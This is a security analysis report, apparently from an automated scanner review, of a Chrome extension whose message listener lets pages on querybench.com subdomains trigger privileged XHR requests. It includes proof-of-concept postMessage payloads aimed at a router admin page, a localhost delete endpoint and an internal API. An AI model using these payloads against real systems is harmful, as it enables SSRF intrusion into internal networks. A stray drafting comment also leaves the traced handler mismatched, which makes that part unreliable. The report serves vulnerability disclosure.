# CoCo Analysis: jhhkebilfgbjalibiccpmkimoeiahljf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (same vulnerability pattern repeated)

---

## Sink: cs_window_eventListener_message → XMLHttpRequest_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jhhkebilfgbjalibiccpmkimoeiahljf/opgen_generated_files/cs_0.js
Line 469, 470

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jhhkebilfgbjalibiccpmkimoeiahljf/opgen_generated_files/bg.js
Line 3256, 3207, 3237

**Code:**

```javascript
// Content script (cs_0.js) - Entry point on *://*.querybench.com/*/mod/*
window.addEventListener("message", function(evt) {
  if (evt.data.enq === 20) { // ← EnqType.QbmDataTransmission
    chrome.runtime.sendMessage(evt.data, function(aResponse) { // ← Forward entire evt.data
      if (!chrome.runtime.lastError && aResponse) {
        window.postMessage({ enq: 21, srcv: evt.data.srcv }, "*");
      }
    });
  }
}, false);

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener(function(aRequest, sender, sendResponse) {
  switch (aRequest.enq) {
    case EnqType.ShowQueryResult: // 30
      // But the trace shows this is triggered when enq === 20 (QbmDataTransmission)
      // Let me find the actual handler for enq === 20
      showQueryResult(aRequest.urlq, aRequest.outp); // ← aRequest.urlq is attacker-controlled
      break;
  }
});

// Query API function
function queryApi(aQueryUrl, extractApiData, callback) {
  if (!aQueryUrl || !aQueryUrl.trim()) {
    callback(errorTitle, errorHtml, errorUrl);
    return;
  }

  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
      // ... process response
      var extractionResult = extractApiData(xhr.responseText);
      // ... callback with results
    }
  }
  xhr.open("GET", aQueryUrl, true); // ← SINK: XMLHttpRequest to attacker-controlled URL
  xhr.send();
}

// ShowQueryResult function
async function showQueryResult(aQueryUrl, outputType) {
  if (isWikiApiUrl(aQueryUrl)) {
    queryApi(aQueryUrl, extractApiDataWiki, async function(resultTitle, resultHtml, resultUrl) {
      await showResultInTab(outputType, aQueryUrl, resultUrl, resultTitle, resultHtml);
    });
  } else if (isGoogleApisUrl(aQueryUrl)) {
    queryApi(aQueryUrl, extractApiDataGoogle, async function(resultTitle, resultHtml, resultUrl) {
      await showResultInTab(outputType, aQueryUrl, resultUrl, resultTitle, resultHtml);
    });
  } else if (isYandexApisUrl(aQueryUrl)) {
    queryApi(aQueryUrl, extractApiDataYandex, async function(resultTitle, resultHtml, resultUrl) {
      await showResultInTab(outputType, aQueryUrl, resultUrl, resultTitle, resultHtml);
    });
  } else {
    await showResultInTab(outputType, aQueryUrl, undefined, undefined, undefined);
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from *://*.querybench.com/*/mod/*

**Attack:**

```javascript
// From any page matching *://*.querybench.com/*/mod/* (e.g., http://evil.querybench.com/a/mod/attack.html)
// Attacker can make privileged XHR requests to arbitrary URLs

// SSRF to internal network
window.postMessage({
  enq: 20,
  urlq: "http://192.168.1.1/admin/config",
  outp: 1
}, "*");

// SSRF to localhost
window.postMessage({
  enq: 20,
  urlq: "http://localhost:8080/admin/delete?user=admin",
  outp: 1
}, "*");

// SSRF to arbitrary external URLs (bypassing CORS)
window.postMessage({
  enq: 20,
  urlq: "https://internal-api.company.com/sensitive-data",
  outp: 1
}, "*");
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability. Attacker on any subdomain of querybench.com can make the extension perform privileged XMLHttpRequest calls to arbitrary URLs, bypassing CORS restrictions. This allows:
1. Accessing internal network resources (localhost, private IPs) that are not accessible from the web
2. Making cross-origin requests with the extension's "<all_urls>" permission, bypassing same-origin policy
3. Potentially exfiltrating data from responses if the extension processes them in a way visible to the attacker
4. Port scanning internal networks
5. Attacking internal services that trust requests from localhost/internal IPs

The extension has "<all_urls>" permission, making this a high-severity SSRF vulnerability.
